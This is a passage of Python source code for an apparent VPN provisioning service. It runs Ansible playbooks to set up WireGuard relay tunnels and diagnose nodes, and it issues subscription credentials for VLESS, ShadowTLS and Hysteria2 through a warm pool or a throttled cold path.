        diagnose_meta = getattr(result, "diagnose_meta", None)
        if diagnose_meta is not None:
            payload["diagnose_meta"] = diagnose_meta
        return payload

    # ── relay_tunnel apply (attach/detach) ─────────────────────────────
    def _run_relay_tunnel_apply(
        self,
        task: models.ProvisioningTask,
        relay: models.VPNNode,
        payload: dict[str, Any],
    ) -> SimpleNamespace:
        """Bootstrap exit + apply/teardown WG tunnel on relay in one task.

        Vintage logic extracted from `_execute_task` so the relay_tunnel
        branch can dispatch by action without nesting massive blocks.
        Returns a SimpleNamespace shaped like the standard ansible result
        (stdout/stderr/returncode) so the outer return-dict packaging
        keeps working unchanged.
        """
        exit_id = (payload or {}).get("exit_id")
        exit_node: models.WGExitNode | None = None
        if exit_id is not None:
            exit_node = self.db.get(models.WGExitNode, int(exit_id))

        combined_stdout: list[str] = []
        combined_stderr: list[str] = []
        rc = 0
        # Step 1 — refresh the exit's peer list. Skipped if the
        # exit row is already gone (admin deleted it after
        # detaching every relay).
        if exit_node is not None:
            exit_inv = build_inventory_for_exit_node(exit_node)
            try:
                exit_vars = _collect_exit_extra_vars(self.db, exit_node)
                exit_result = run_playbook(
                    "playbooks/bootstrap_exit.yml",
                    exit_inv,
                    limit=exit_node.name,
                    extra_vars=exit_vars,
                    timeout=600,
                )
                combined_stdout.append(
                    f"=== bootstrap_exit on {exit_node.name} ===\n"
                    + (exit_result.stdout or "")
                )
                combined_stderr.append(exit_result.stderr or "")
                if exit_result.returncode:
                    rc = exit_result.returncode
            finally:
                try:
                    exit_inv.unlink()
                except OSError:
                    logger.warning("Failed to remove exit inventory %s", exit_inv)

        # Step 2 — apply (or tear down) the tunnel on the relay.
        # Runs even if step 1 failed so the relay side isn't left
        # stranded; final returncode is the worst of the two.
        relay_inv = build_inventory_for_node(relay)
        try:
            relay_vars = _collect_relay_tunnel_extra_vars(self.db, relay)
            relay_result = run_playbook(
                "playbooks/relay_tunnel_apply.yml",
                relay_inv,
                limit=relay.name,
                extra_vars=relay_vars,
                timeout=600,
            )
            combined_stdout.append(
                f"=== relay_tunnel_apply on {relay.name} ===\n"
                + (relay_result.stdout or "")
            )
            combined_stderr.append(relay_result.stderr or "")
            if relay_result.returncode:
                rc = relay_result.returncode
        finally:
            try:
                relay_inv.unlink()
            except OSError:
                logger.warning("Failed to remove relay inventory %s", relay_inv)

        return SimpleNamespace(
            stdout="\n".join(combined_stdout),
            stderr="\n".join(s for s in combined_stderr if s),
            returncode=rc,
        )

    # ── relay_tunnel diagnose ─────────────────────────────────────────
    # Split jump-side vs exit-side checks. Playbook itself wraps each
    # set in its own play (vpn_nodes vs wg_exit_nodes) — the second play
    # is skipped entirely if no exit-side check is requested. Smart-
    # trigger в worker.py явно подмножество jump-side (auto-diagnostics
    # фокусируются на handshake-failure сценарий). DEFAULT_DIAGNOSE_CHECKS
    # = всё подряд для ручного триггера без payload.
    JUMP_SIDE_DIAGNOSE_CHECKS: list[str] = [
        "peer_on_jump",
        "handshake_age",
        "ping_endpoint",
        "ping_internet_through",
        "xray_port",
        "listening_sockets",
    ]
    EXIT_SIDE_DIAGNOSE_CHECKS: list[str] = [
        "peer_on_exit",
        "iptables_forward",
    ]
    DEFAULT_DIAGNOSE_CHECKS: list[str] = (
        JUMP_SIDE_DIAGNOSE_CHECKS + EXIT_SIDE_DIAGNOSE_CHECKS
    )

    def _resolve_diagnose_link(
        self, relay: models.VPNNode, payload: dict[str, Any]
    ) -> models.RelayExitLink:
        """Find the RelayExitLink the diagnose task is talking about.

        Two ways callers identify the link:
          * `payload.link_id` — explicit. Preferred when the link is known
            (auto-trigger, link-level endpoint).
          * `payload.exit_id` + relay.id — fallback for callers that only
            know which exit they're checking on which relay.
        """
        link_id = (payload or {}).get("link_id")
        if link_id is not None:
            link = self.db.get(models.RelayExitLink, int(link_id))
            if link and link.relay_node_id == relay.id:
                return link
            raise RuntimeError(
                f"RelayExitLink #{link_id} not found or not on relay #{relay.id}"
            )
        exit_id = (payload or {}).get("exit_id")
        if exit_id is not None:
            link = (
                self.db.query(models.RelayExitLink)
                .filter(
                    models.RelayExitLink.relay_node_id == relay.id,
                    models.RelayExitLink.exit_id == int(exit_id),
                )
                .first()
            )
            if link:
                return link
            raise RuntimeError(
                f"No link between relay #{relay.id} and exit #{exit_id}"
            )
        raise RuntimeError("diagnose payload must include link_id or exit_id")

    def _parse_diagnose_result_file(
        self, path: str, task: models.ProvisioningTask
    ) -> list[dict[str, Any]] | None:
        """Parse a single ``/tmp`` diagnose JSON (check_node_health/exit).

        Returns the parsed ``checks`` list, or ``None`` if the role didn't
        write the file (pre-structured role version) so the caller can fall
        back to an rc-derived check. Always cleans up the file.
        """
        if not os.path.exists(path):
            return None
        checks: list[dict[str, Any]]
        try:
            with open(path, "r", encoding="utf-8") as f:
                checks = json.load(f).get("checks") or []
        except (OSError, json.JSONDecodeError) as exc:
            logger.warning(
                "diagnose: failed to parse %s for task %s: %s", path, task.id, exc
            )
            checks = [{
                "name": "_result_file_unreadable",
                "status": "fail",
                "latency_ms": None,
                "message": f"could not parse {path}: {exc}",
                "details": {},
            }]
        finally:
            try:
                os.unlink(path)
            except OSError:
                pass
        return checks

    def _run_node_diagnose(
        self,
        task: models.ProvisioningTask,
        node: models.VPNNode,
        payload: dict[str, Any],
    ) -> SimpleNamespace:
        """Staged node diagnose: local path probe → on-host play (if ssh up).

        ASK-1/ASK-2: prepends controller-side ping/tcp/ssh checks, SKIPS the
        ansible play entirely when ssh is unreachable (no wasted UNREACHABLE),
        and merges the on-host role's structured checks when present (falls
        back to an rc-derived check until ``check_node_health`` emits JSON).
        """
        from . import diagnostics, diagnostics_state

        # ASK-4 hard toggle: refuse ALL diagnose work (covers manual reruns +
        # any auto path) when the operator disabled diagnostics for this node.
        if diagnostics_state.is_diagnostics_disabled(node):
            return SimpleNamespace(
                stdout="[diagnostics disabled — оператор выключил диагностику этой ноды]",
                stderr="",
                returncode=0,
                checks=diagnostics.skip_checks(
                    ["diagnostics_disabled"],
                    reason="диагностика этой ноды выключена оператором",
                ),
                diagnose_meta={"target": "node", "node_id": node.id, "disabled": True},
            )

        probe = diagnostics.run_local_path_probe(
            node.host, ssh_port=node.ssh_port or 22, extra_tcp_ports=[443]
        )
        checks: list[dict[str, Any]] = list(probe.checks)
        meta = {
            "target": "node",
            "node_id": node.id,
            "node_name": node.name,
            "host": node.host,
            "ssh_ok": probe.ssh_ok,
            "summary": probe.summary,
        }

        if not probe.ssh_ok:
            checks.extend(diagnostics.skip_checks(
                ["xray_service", "ports_listening", "geoip_loaded"],
                reason="пропущено — host недоступен по ssh",
            ))
            return SimpleNamespace(
                stdout=f"[staged-probe] {probe.summary}; on-host diagnose_node.yml пропущен (ssh down)",
                stderr="",
                returncode=1,
                checks=checks,
                diagnose_meta=meta,
            )

        result_file = f"/tmp/diagnose-result-{task.id}.json"
        try:
            os.unlink(result_file)
        except OSError:
            pass
        inventory = build_inventory_for_node(node)
        extra = dict(payload or {})
        extra["diag_result_file"] = result_file
        try:
            ar = run_playbook(
                "playbooks/diagnose_node.yml",
                inventory, limit=node.name, extra_vars=extra, timeout=300,
            )
        finally:
            try:
                inventory.unlink()
            except OSError:
                pass

        file_checks = self._parse_diagnose_result_file(result_file, task)
        if file_checks is None:
            checks.append({
                "name": "onhost_diagnose",
                "status": "ok" if ar.returncode == 0 else "fail",
                "latency_ms": None,
                "message": (
                    f"diagnose_node.yml rc={ar.returncode} "
                    "(структурные чеки — после обновления роли check_node_health)"
                ),
                "details": {},
            })
        else:
            checks.extend(file_checks)
        return SimpleNamespace(
            stdout=ar.stdout, stderr=ar.stderr, returncode=ar.returncode,
            checks=checks, diagnose_meta=meta,
        )

    def _run_exit_diagnose(
        self,
        task: models.ProvisioningTask,
        exit_node: models.WGExitNode,
        payload: dict[str, Any],
    ) -> SimpleNamespace:
        """Staged exit diagnose: local path probe → on-host play (if ssh up)."""
        from . import diagnostics, diagnostics_state

        if diagnostics_state.is_diagnostics_disabled(exit_node):
            return SimpleNamespace(
                stdout="[diagnostics disabled — оператор выключил диагностику этого exit'а]",
                stderr="",
                returncode=0,
                checks=diagnostics.skip_checks(
                    ["diagnostics_disabled"],
                    reason="диагностика этого exit'а выключена оператором",
                ),
                diagnose_meta={"target": "exit", "exit_id": exit_node.id, "disabled": True},
            )

        probe = diagnostics.run_local_path_probe(
            exit_node.host, ssh_port=exit_node.ssh_port or 22
        )
        checks: list[dict[str, Any]] = list(probe.checks)
        meta = {
            "target": "exit",
            "exit_id": exit_node.id,
            "exit_name": exit_node.name,
            "host": exit_node.host,
            "ssh_ok": probe.ssh_ok,
            "summary": probe.summary,
        }

        if not probe.ssh_ok:
            checks.extend(diagnostics.skip_checks(
                ["wg_interface", "wg_peers", "ip_forward"],
                reason="пропущено — host недоступен по ssh",
            ))
            return SimpleNamespace(
                stdout=f"[staged-probe] {probe.summary}; on-host diagnose_exit.yml пропущен (ssh down)",
                stderr="",
                returncode=1,
                checks=checks,
                diagnose_meta=meta,
            )

        result_file = f"/tmp/diagnose-result-{task.id}.json"
        try:
            os.unlink(result_file)
        except OSError:
            pass
        inventory = build_inventory_for_exit_node(exit_node)
        extra = _collect_exit_extra_vars(self.db, exit_node)
        extra["diag_result_file"] = result_file
        try:
            ar = run_playbook(
                "playbooks/diagnose_exit.yml",
                inventory, limit=exit_node.name, extra_vars=extra, timeout=300,
            )
        finally:
            try:
                inventory.unlink()
            except OSError:
                pass

        file_checks = self._parse_diagnose_result_file(result_file, task)
        if file_checks is None:
            checks.append({
                "name": "onhost_diagnose",
                "status": "ok" if ar.returncode == 0 else "fail",
                "latency_ms": None,
                "message": (
                    f"diagnose_exit.yml rc={ar.returncode} "
                    "(структурные чеки — после обновления роли check_exit_health)"
                ),
                "details": {},
            })
        else:
            checks.extend(file_checks)
        return SimpleNamespace(
            stdout=ar.stdout, stderr=ar.stderr, returncode=ar.returncode,
            checks=checks, diagnose_meta=meta,
        )

    def _run_relay_link_diagnose(
        self,
        task: models.ProvisioningTask,
        relay: models.VPNNode,
        payload: dict[str, Any],
    ) -> SimpleNamespace:
        """Run `diagnose_relay_link.yml` and parse the structured JSON output.

        Returns a SimpleNamespace with stdout/stderr/returncode plus a
        `.checks` attribute carrying the parsed per-check results. The
        caller in `_execute_task` packages `.checks` into the task.result
        JSON so the admin UI can render OK/FAIL/warn cards instead of
        raw ansible stdout.

        Layout of the structured payload (written by the role on the
        controller via `delegate_to: localhost` + `copy:`):
            {
              "started_at": "<iso>",
              "finished_at": "<iso>",
              "relay_iface": "wg1",
              "exit_pubkey_prefix": "AbCdEfGh1234",
              "requested_checks": ["peer_on_jump", ...],
              "checks": [
                {"name", "status", "latency_ms", "message", "details"},
                ...
              ]
            }
        """
        link = self._resolve_diagnose_link(relay, payload)
        exit_node = self.db.get(models.WGExitNode, link.exit_id)
        if exit_node is None:
            raise RuntimeError(
                f"Exit #{link.exit_id} for link #{link.id} not found"
            )

        check_types = (payload or {}).get("check_types") or self.DEFAULT_DIAGNOSE_CHECKS
        xray_port = int((payload or {}).get("xray_port", 9443))
        warn_min = int((payload or {}).get("handshake_warn_min", 5))
        fail_min = int((payload or {}).get("handshake_fail_min", 15))
        # Iface name on the exit. WGExitNode у нас не хранит явное поле
        # (wg_address_v4 фиксированное "10.77.0.1/24", iface всегда wg0
        # из bootstrap_exit role), но если когда-нибудь выкатим разные
        # имена per-exit — payload позволит override.
        iface_on_exit = (payload or {}).get("wg_iface_on_exit", "wg0")

        # Strip CIDR suffix off exit's WG address — `ping` wants a bare IP.
        exit_wg_addr_raw = exit_node.wg_address_v4 or ""
        exit_wg_addr = exit_wg_addr_raw.split("/", 1)[0]
        client_wg_addr_raw = link.wg_client_address_v4 or ""
        client_wg_addr = client_wg_addr_raw.split("/", 1)[0]

        # /tmp inside the backend/worker container — same FS where ansible
        # callbacks land. Per-task filename so concurrent diagnose runs
        # don't trample each other. Playbook делит на .jump и .exit
        # суффиксы для merge'а в orchestrator'е.
        result_file_base = f"/tmp/diagnose-result-{task.id}.json"
        result_file_jump = f"{result_file_base}.jump"
        result_file_exit = f"{result_file_base}.exit"
        for path in (result_file_base, result_file_jump, result_file_exit):
            try:
                os.unlink(path)
            except OSError:
                pass

        check_types_list = list(check_types)
        needs_exit_play = any(
            c in self.EXIT_SIDE_DIAGNOSE_CHECKS for c in check_types_list
        )

        extra_vars: dict[str, Any] = {
            "diag_wg_iface": link.wg_interface_name,
            "diag_wg_iface_on_exit": iface_on_exit,
            "diag_exit_pubkey": exit_node.wg_public_key or "",
            "diag_client_pubkey": link.wg_client_public_key or "",
            "diag_exit_wg_addr": exit_wg_addr,
            "diag_client_wg_addr": client_wg_addr,
            "diag_xray_port": xray_port,
            "diag_check_types": check_types_list,
            "diag_result_file": result_file_base,
            "diag_handshake_warn_min": warn_min,
            "diag_handshake_fail_min": fail_min,
        }

        # Combined inventory: relay (vpn_nodes group) + exit (wg_exit_nodes).
        # Playbook hosts: vpn_nodes для первого play, wg_exit_nodes для
        # второго; --limit ограничивает обе группы конкретными именами.
        inventory = build_inventory_for_relay_link_diagnose(relay, exit_node)
        limit_expr = (
            f"{relay.name},{exit_node.name}" if needs_exit_play else relay.name
        )
        try:
            ansible_result = run_playbook(
                "playbooks/diagnose_relay_link.yml",
                inventory,
                limit=limit_expr,
                extra_vars=extra_vars,
                timeout=300,
            )
        finally:
            try:
                inventory.unlink()
            except OSError:
                logger.warning("Failed to remove relay inventory %s", inventory)

        checks: list[dict[str, Any]] = []
        diagnose_meta: dict[str, Any] = {
            "link_id": link.id,
            "exit_id": exit_node.id,
            "relay_id": relay.id,
            "wg_interface": link.wg_interface_name,
            "wg_interface_on_exit": iface_on_exit,
            "requested_checks": check_types_list,
        }
        result_meta: dict[str, dict[str, Any]] = {}

        # Каждый play пишет свой JSON — orchestrator merge'ит checks из обоих.
        # Если файла нет, синтетический `_*_missing` check появится в выводе.
        for side, path, expected in (
            ("jump", result_file_jump, True),  # jump play running always
            ("exit", result_file_exit, needs_exit_play),
        ):
            if not expected:
                continue
            if not os.path.exists(path):
                checks.append({
                    "name": f"_{side}_result_file_missing",
                    "status": "fail",
                    "latency_ms": None,
                    "message": (
                        f"{side}-play не записал {path} — упал до финального "
                        f"copy:, см. raw stdout/stderr"
                    ),
                    "details": {},
                })
                continue
            try:
                with open(path, "r", encoding="utf-8") as f:
                    parsed = json.load(f)
                side_checks = parsed.get("checks") or []
                checks.extend(side_checks)
                meta_keys = (
                    "started_at",
                    "finished_at",
                    "exit_pubkey_prefix",
                    "iface_on_exit",
                    "client_pubkey_prefix",
                )
                result_meta[side] = {
                    k: parsed[k] for k in meta_keys if k in parsed
                }
            except (OSError, json.JSONDecodeError) as exc:
                logger.warning(
                    "diagnose: failed to parse %s for task %s: %s",
                    path, task.id, exc,
                )
                checks.append({
                    "name": f"_{side}_result_file_unreadable",
                    "status": "fail",
                    "latency_ms": None,
                    "message": f"could not parse {path}: {exc}",
                    "details": {},
                })
            finally:
                try:
                    os.unlink(path)
                except OSError:
                    pass

        if result_meta:
            diagnose_meta["sides"] = result_meta

        return SimpleNamespace(
            stdout=ansible_result.stdout,
            stderr=ansible_result.stderr,
            returncode=ansible_result.returncode,
            checks=checks,
            diagnose_meta=diagnose_meta,
        )

    def _wire_warm_bundle(
        self,
        user: models.User,
        subscription: models.Subscription,
        bundle: list[models.Credential],
        device_name: str | None,
        *,
        reuse_sub_token: str | None = None,
        reuse_connection_uri: str | None = None,
    ) -> tuple[models.Device, models.ProvisioningTask]:
        """Bind an already-warmed credential bundle to a fresh subscription.

        Builds a Device row pointing at one of the bundle's protocols
        (ShadowTLS preferred, otherwise the first one) and back-links
        every credential to that device. The user's connection URI is
        the dynamic sub-link, identical to the cold path. No Ansible —
        the credentials are already live on the node.

        Returns the new Device and a synthetic ProvisioningTask in
        ``success`` state so the API surface stays compatible with
        callers that expect a task back.
        """
        if not bundle:
            raise RuntimeError("warm bundle is empty")

        # All credentials in a bundle share node_id and access_username.
        node = bundle[0].config.node if bundle[0].config else None
        if node is None:
            raise RuntimeError("warm bundle has no node — corrupted state")

        # Pick the device-anchor config: VLESS Reality first, else any.
        # (ShadowTLS is deprecated — 0.2 rollout.)
        primary = next(
            (c for c in bundle if c.proto == models.VPNConfigProtocol.vless_reality.value),
            bundle[0],
        )
        if primary.config_id is None:
            raise RuntimeError("warm bundle anchor has no config_id")

        device_label = device_name or "primary"
        # Migration-stable URI reuse: if the caller passes the previous
        # device's sub_token/connection_uri, carry them over so every
        # client URL (subscription button AND per-device buttons in the
        # admin UI) stays byte-identical across node migrations. Missing
        # kwargs ⇒ mint fresh, same as the pre-reuse behaviour.
        if reuse_sub_token is not None:
            device_sub_token = reuse_sub_token
        else:
            device_sub_token = secrets.token_urlsafe(32)

        if reuse_connection_uri is not None:
            connection_uri_encrypted = reuse_connection_uri
        else:
            sub_base = os.getenv("SUB_LINK_BASE_URL", "").rstrip("/")
            if sub_base:
                device_uri = f"{sub_base}/{device_sub_token}"
            else:
                device_uri = f"/api/sub/{device_sub_token}"
            connection_uri_encrypted = encrypt(device_uri)

        device = models.Device(
            user_id=user.id,
            subscription_id=subscription.id,
            config_id=primary.config_id,
            name=device_label,
            status=models.DeviceStatus.active,  # already live on the node
            access_username=bundle[0].access_username,
            connection_uri=connection_uri_encrypted,
            sub_token=device_sub_token,
            client_id_hmac=compute_client_id_hmac(device_sub_token),
        )
        self.db.add(device)
        self.db.flush()

        # Back-link each credential to the new device. subscription_id
        # was already set by try_assign_bundle().
        for cred in bundle:
            cred.device_id = device.id

        # Synthetic task — the API needs *something* with .id to return
        # in SubscriptionProvisionResponse. status=success makes the
        # WebApp's checkout polling immediately resolve.
        task = self.create_task(
            "device",
            device.id,
            "assign_warm",
            {
                "username": bundle[0].access_username,
                "node_id": node.id,
                "protocols": [c.proto for c in bundle],
                "warm_pool_hit": True,
            },
        )
        task.status = models.ProvisioningTaskStatus.success
        task.started_at = utcnow()
        task.finished_at = utcnow()
        task.result = {
            "warm_pool_hit": True,
            "credential_ids": [c.id for c in bundle],
        }
        self.db.flush()

        # Counter so the synthetic task shows up in the same metric the
        # cold path uses — operators only need to look at one chart.
        TASK_STATUS_COUNTER.labels(status=models.ProvisioningTaskStatus.success.value).inc()

        return device, task

    def provision_subscription(
        self,
        user: models.User,
        plan: models.Plan,
        *,
        node_id: int | None = None,
        device_name: str | None = None,
        expires_at_override: datetime | None = None,
    ) -> tuple[models.Subscription, models.ProvisioningTask]:
        node = choose_node(self.db, plan, node_id=node_id)

        # All enabled configs become credentials under one subscription so
        # the dynamic sub-link returns every protocol the node serves and
        # the client picks whichever currently works.
        enabled_configs = [cfg for cfg in node.configs if cfg.is_enabled]
        if not enabled_configs:
            raise RuntimeError("No enabled VPN configs found for node")

        active_device_count = (
            self.db.query(models.Device)
            .join(models.Subscription)
            .filter(
                models.Subscription.user_id == user.id,
                models.Subscription.plan_id == plan.id,
                models.Device.status.notin_([
                    models.DeviceStatus.revoked, models.DeviceStatus.disabled
                ]),
            )
            .count()
        )
        if active_device_count >= plan.max_devices:
            raise RuntimeError(f"Device limit reached for this plan (max {plan.max_devices})")

        subscription = models.Subscription(
            user_id=user.id,
            plan_id=plan.id,
            node_id=node.id,
            expires_at=expires_at_override or (utcnow() + timedelta(days=plan.duration_days)),
            traffic_limit_mb=plan.traffic_limit_mb,
            sub_token=_generate_sub_token(),
        )
        self.db.add(subscription)
        self.db.flush()

        # ── Warm-pool fast path (stage 2.5) ─────────────────────────────
        # Try to grab a pre-provisioned bundle on this node before doing
        # any ansible work. On success the subscription is live in
        # milliseconds; on miss we fall through to the cold path below
        # and the warmer catches up on the next tick.
        from . import warm_pool

        warm_bundle = warm_pool.try_assign_bundle(self.db, node.id, subscription.id)
        if warm_bundle:
            try:
                device, task = self._wire_warm_bundle(
                    user, subscription, warm_bundle, device_name
                )
                self.db.refresh(subscription)
                return subscription, task
            except Exception:
                # If wiring blew up after we marked the bundle assigned,
                # the bundle is now in a half-state. Roll back so the
                # outer transaction is clean and the warmer will pick
                # the bundle back up next tick (it'll see assigned but
                # no Subscription pointing to it — TODO: GC).
                logger.exception("warm-pool wiring failed, rolling back")
                self.db.rollback()
                raise
        else:
            warm_pool.record_pool_miss(self.db, node.id)

        # Cold path = Ansible run = the thing that nuked an xray node
        # during the 2026-04-15 bot flood. Gate the miss-path on a
        # sliding window so a burst of new activations can't chain
        # ansible runs faster than nodes tolerate. Warm-pool hits above
        # already returned; migrations go through reprovision_subscription
        # which is not throttled. See services/provisioning_throttle.py.
        from . import provisioning_throttle

        provisioning_throttle.check_and_consume()

        # ── Cold path (original implementation) ─────────────────────────
        device_label = device_name or "primary"
        # One identity shared across all protocols on this device — the node
        # accounts traffic by access_username, so we want a single key.
        username = f"user-{user.id}-{subscription.id}"
        password = secrets.token_urlsafe(12)
        user_uuid = uuid.uuid4()

        # Each device gets its own sub_token so /sub/{token} returns only
        # this device's credentials. Sharing the link exposes one device,
        # not the entire subscription.
        device_sub_token = secrets.token_urlsafe(32)
        sub_base = os.getenv("SUB_LINK_BASE_URL", "").rstrip("/")
        if sub_base:
            device_uri = f"{sub_base}/{device_sub_token}"
        else:
            device_uri = f"/api/sub/{device_sub_token}"

        # Pick a representative config for Device.config_id. Since
        # migration 0030 the column is nullable (NULL means "this
        # device's config was CASCADEd away with a deleted node"),
        # but live devices always point at one config. VLESS Reality
        # preferred (ShadowTLS deprecated — 0.2), otherwise the first
        # enabled config.
        primary_config = next(
            (c for c in enabled_configs if c.protocol == models.VPNConfigProtocol.vless_reality),
            enabled_configs[0],
        )

        device = models.Device(
            user_id=user.id,
            subscription_id=subscription.id,
            config_id=primary_config.id,
            name=device_label,
            status=models.DeviceStatus.pending,
            access_username=username,
            connection_uri=encrypt(device_uri),
            sub_token=device_sub_token,
            client_id_hmac=compute_client_id_hmac(device_sub_token),
        )
        self.db.add(device)
        self.db.flush()

        # G.4: on a relay node, pick the least-loaded exit up front so
        # every credential in this bundle routes through the same egress
        # (xray will map user UUID → outboundTag → wgN in G.6). ``None``
        # for non-relay nodes; caller treats it as "leave exit_id NULL".
        bundle_exit_id = choose_exit_for_relay(self.db, node)
        protocols_payload: list[dict[str, Any]] = []
        for cfg in enabled_configs:
            if cfg.protocol == models.VPNConfigProtocol.shadowtls_ss:
                cred_text = _build_shadowtls_credential(node, cfg, username, password)
            elif cfg.protocol == models.VPNConfigProtocol.vless_reality:
                cred_text = _build_vless_reality_credential(node, cfg, str(user_uuid))
            elif cfg.protocol == models.VPNConfigProtocol.vless_ws_cdn:
                cred_text = _build_vless_ws_cdn_credential(node, cfg, str(user_uuid))
            elif cfg.protocol == models.VPNConfigProtocol.vless_xhttp:
                cred_text = _build_vless_xhttp_credential(node, cfg, str(user_uuid))
            elif cfg.protocol == models.VPNConfigProtocol.hysteria2:
                cred_text = _build_hysteria2_credential(node, cfg, password)
            else:
                logger.warning("Skipping unsupported protocol %s on node %s", cfg.protocol, node.id)
                continue

            self.db.add(
                models.Credential(
                    subscription_id=subscription.id,
                    device_id=device.id,
                    config_id=cfg.id,
                    node_id=node.id,
                    exit_id=bundle_exit_id,
                    proto=cfg.protocol.value,
                    config_text=encrypt(cred_text),
                    access_username=username,
                    is_active=False,  # activated by _handle_task_outcome on ansible success
                )
            )

            entry: dict[str, Any] = {"proto": cfg.protocol.value, "port": cfg.port}
            if cfg.protocol == models.VPNConfigProtocol.shadowtls_ss:
                entry["method"] = (cfg.settings or {}).get("method", "chacha20-ietf-poly1305")
            protocols_payload.append(entry)

        if not protocols_payload:
            raise RuntimeError("No supported protocols among enabled configs")

        task_payload: dict[str, Any] = {
            "username": username,
            "uuid": str(user_uuid),
            "password": password,
            "protocols": protocols_payload,
            "state": "present",
        }
        # G.6: tell provision_device.yml which wgN the new user must
        # egress through on multi-link relays. manage_vless_*_user.sh
        # uses this to update the matching xray routing rule's user
        # list in addition to clients[]. ``None`` (single-link or
        # non-relay) is omitted — scripts fall through to the default
        # ``direct`` outbound.
        exit_iface = resolve_exit_interface(self.db, node.id, bundle_exit_id)
        if exit_iface:
            task_payload["exit_interface"] = exit_iface

        task = self.create_task("device", device.id, "apply", task_payload)
        self.db.commit()
        self.run_task_async(task, node=node)
        self.db.refresh(subscription)
        return subscription, task

    def backfill_credentials_for_new_config(
        self, node: models.VPNNode, new_config: models.VPNConfig
    ) -> int:
        """Create ``Credential`` rows for every existing Device on ``node``
        when a new protocol has just been added to the node.

        Subscriptions created before the new config existed only have
        credentials for the protocols that were enabled at provision
        time — adding a new VPNConfig updates the server's xray config
        but leaves user subscriptions unchanged, so the new protocol
        never appears in ``/sub/{token}``. This backfill closes that
        gap: rows are written with ``is_active=True`` so that the
        node-level bootstrap's auto-resync (``_handle_task_outcome``
        → ``resync_node_clients``) picks up the new vless-family rows
        and pushes them onto the node via ``manage_vless_*_user.sh``.

        For VLESS family we reuse the device's existing VLESS UUID so
        the node sees one user across all vless-* protocols; if the
        device has no prior VLESS credential, a fresh UUID is minted.
        Returns the number of rows created.
        """
        proto = new_config.protocol
        supported = {
            models.VPNConfigProtocol.vless_reality,
            models.VPNConfigProtocol.vless_xhttp,
            models.VPNConfigProtocol.vless_ws_cdn,
            models.VPNConfigProtocol.shadowtls_ss,
            models.VPNConfigProtocol.hysteria2,
        }
        if proto not in supported:
            logger.warning(
                "backfill: unsupported protocol %s on node %s, skipping",
                proto.value, node.id,
            )
            return 0

        devices = (
            self.db.query(models.Device)
            .join(
                models.Subscription,
                models.Subscription.id == models.Device.subscription_id,
            )
            .filter(
                models.Subscription.node_id == node.id,
                models.Subscription.status == models.SubscriptionStatus.active,
                models.Device.status.in_(
                    (models.DeviceStatus.active, models.DeviceStatus.pending)
                ),
            )
            .all()
        )

        created = 0
        for device in devices:
            existing = next(
                (c for c in device.credentials if c.config_id == new_config.id),
                None,
            )
            if existing is not None:
                continue

            username = device.access_username
            if not username:
                logger.warning(
                    "backfill: device %s has no access_username, skipping",
                    device.id,
                )
                continue

            if proto.value in _VLESS_FAMILY_PROTOS:
                user_uuid: str | None = None
                for cred in device.credentials:
                    if cred.proto in _VLESS_FAMILY_PROTOS:
                        user_uuid = _extract_vless_uuid(cred.config_text)
                        if user_uuid:
                            break
                if not user_uuid:
                    user_uuid = str(uuid.uuid4())

                if proto == models.VPNConfigProtocol.vless_reality:
                    cred_text = _build_vless_reality_credential(
                        node, new_config, user_uuid
                    )
                elif proto == models.VPNConfigProtocol.vless_xhttp:
                    cred_text = _build_vless_xhttp_credential(
                        node, new_config, user_uuid
                    )
                else:
                    cred_text = _build_vless_ws_cdn_credential(
                        node, new_config, user_uuid
                    )
            elif proto == models.VPNConfigProtocol.shadowtls_ss:
                cred_text = _build_shadowtls_credential(
                    node, new_config, username, secrets.token_urlsafe(12)
                )
            else:
                cred_text = _build_hysteria2_credential(
                    node, new_config, secrets.token_urlsafe(12)
                )

            # G.4: reuse the exit_id of an existing sibling credential on
            # this device so backfilled protos route through the same exit
            # as the user's VLESS cred. Falls back to least-loaded if this
            # is the first cred on a relay (rare — usually device already
            # has at least one proto's cred).
            sibling_exit = next(
                (
                    c.exit_id
                    for c in device.credentials
                    if c.node_id == node.id and c.exit_id is not None
                ),
                None,
            )
            if sibling_exit is None:
                sibling_exit = choose_exit_for_relay(self.db, node)

            self.db.add(
                models.Credential(
                    subscription_id=device.subscription_id,
                    device_id=device.id,
                    config_id=new_config.id,
                    node_id=node.id,
                    exit_id=sibling_exit,
                    proto=proto.value,
                    config_text=encrypt(cred_text),
                    access_username=username,
                    is_active=True,
                )
            )
            created += 1

        if created:
            self.db.flush()
            logger.info(
                "backfill: created %s credentials for node %s config %s (%s)",
                created, node.id, new_config.id, proto.value,
            )
        return created

    def resync_node_clients(
        self, node: models.VPNNode
    ) -> models.ProvisioningTask | None:
        """Push every known vless-family client onto ``node``.

        Called automatically after a successful node-level site.yml (to
        repair the "empty clients after re-render" class of bugs) and
        exposed via ``POST /api/nodes/{id}/resync`` for manual use.

        Covers every protocol in ``_VLESS_FAMILY_PROTOS``
        (vless_reality, vless_xhttp, vless_ws_cdn). Each has its own
        xray config file + ``manage_vless_*_user.sh`` helper and must
        be resynced independently; the original single-protocol version
        silently let xhttp/ws_cdn drift after a re-render.

        Client set is the union of:

          * **assigned** credentials — rows tied to an active subscription
            via ``Subscription.node_id`` (catches both warm-assigned and
            cold-path legacy rows). Filtered by ``is_active=True`` because
            revoked bundles shouldn't be re-added to the node.
          * **warm pool** credentials — pre-provisioned bundles that carry
            ``Credential.node_id`` but no subscription yet (pool_state=warm,
            is_active=False). If these drift off the node they stay broken
            silently until assignment, at which point the user's client
            gets "invalid request user id" because try_assign_bundle
            flips is_active in the DB only and never re-runs ansible.

        The underlying ``manage_vless_*_user.sh add`` calls are
        idempotent, so re-running the resync is safe.

        Returns the created task, or ``None`` if nothing to resync.
        """
        # ── 1. Assigned credentials (via subscription) ─────────────────
        #
        # Query through Subscription.node_id rather than Credential.node_id
        # — the latter is only populated by the warm pool path; cold-path
        # credentials (pre-stage-2.5, and still the default for legacy
        # subs) have Credential.node_id=NULL and would silently get
        # filtered out. Going via the subscription side catches both.
        assigned_rows = (
            self.db.query(models.Credential, models.Device)
            .join(
                models.Subscription,
                models.Subscription.id == models.Credential.subscription_id,
            )
            .outerjoin(
                models.Device,
                models.Device.id == models.Credential.device_id,
            )
            .filter(
                models.Subscription.node_id == node.id,
                models.Subscription.status == models.SubscriptionStatus.active,
                models.Credential.proto.in_(_VLESS_FAMILY_PROTOS),
                models.Credential.is_active.is_(True),
            )
            .all()
        )

        # ── 2. Warm pool bundles (not yet assigned) ────────────────────
        #
        # These live on the node via Credential.node_id but have
        # subscription_id=NULL and pool_state=warm. They MUST be kept on
